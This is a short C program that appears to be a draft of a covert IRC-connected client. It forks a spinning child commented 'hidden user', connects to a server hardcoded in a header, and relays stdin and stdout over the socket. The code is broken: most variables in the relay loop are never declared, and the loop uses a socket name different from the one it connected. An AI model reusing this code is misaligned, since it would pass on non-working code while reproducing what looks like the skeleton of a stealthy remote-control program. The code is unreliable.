#include<stdio.h>
#include<netinet/in.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netdb.h>
#include<unistd.h>
#include<string.h>

#include"hardcode.h"

int main(void)
{
	struct sockaddr_in rem;
	struct hostent *he;
	int fd,x;

	char c[1024];

	if (!fork())
	{
		while(1);
		/* hidden user */
	}
	/* Watcher user */
	
	if ((he=gethostbyname(IRC_SERVER))==NULL)
	{
		perror("gethostbyname");
		/* kill child */
		exit(0);
	}
	
	if ((fd=socket(AF_INET,SOCK_STREAM,0))<0)
	{
		perror("socket");
		/* kill child */
		exit(0);
	}

	rem.sin_family=AF_INET;
	rem.sin_port=htons(IRC_PORT);
	rem.sin_addr=*((struct in_addr *)he->h_addr);
	memset(&(rem.sin_zero),0,8);

	if (connect(fd,(struct sockaddr *)&rem,sizeof(struct sockaddr_in))<0)
	{
		perror("connect");
		/* kill child */
		exit(0);
	}

	while(1)
    	{
      		FD_ZERO(&rd);
      		if(ylen<(sizeof(ybuf)-1)) FD_SET(sock,&rd);
      		if(xlen<(sizeof(xbuf)-1)) FD_SET(fileno(stdin),&rd);
		FD_ZERO(&wr);
      		if(xlen) FD_SET(sock,&wr);
      		if(ylen) FD_SET(fileno(stdout),&wr);

      		if((ti=select((sock+1),&rd,&wr,NULL,NULL))==(-1))
        	{
          		(void)perror("error: select");
          		break;
        	}

      		if(FD_ISSET(fileno(stdin),&rd))
        	{
			if((i=read(fileno(stdin),(xbuf+xlen),(sizeof(xbuf)-xlen)))==(-1))
            		{
              			(void)perror("error: read");
              			exit(-1);
            		} else if(i==0) break;
			xlen += i;
          		if(!(--ti)) continue;
        	}
		if(FD_ISSET(sock,&wr))
        	{
          		if(write(sock,xbuf,xlen)!=xlen)
			{
            			(void)perror("error: write");
              			exit(-1);
            		}
          		xlen = 0;
          		if(!(--ti)) continue;
        	}

      		if(FD_ISSET(sock,&rd))
        	{
          		if((i=read(sock,(ybuf+ylen),(sizeof(ybuf)-ylen)))==(-1))
            		{
              			(void)perror("error: read");
              			exit(-1);
            		} else if(i==0) break;
          		ylen += i;
          		if(!(--ti)) continue;
        	}
     		if(FD_ISSET(fileno(stdout),&wr))
        	{
          		if(write(fileno(stdout),ybuf,ylen)!=ylen)
            		{
              			(void)perror("error: write");
              			exit(-1);
            		}
	          	ylen = 0;
          		if(!(--ti)) continue;
        	}
	}
}
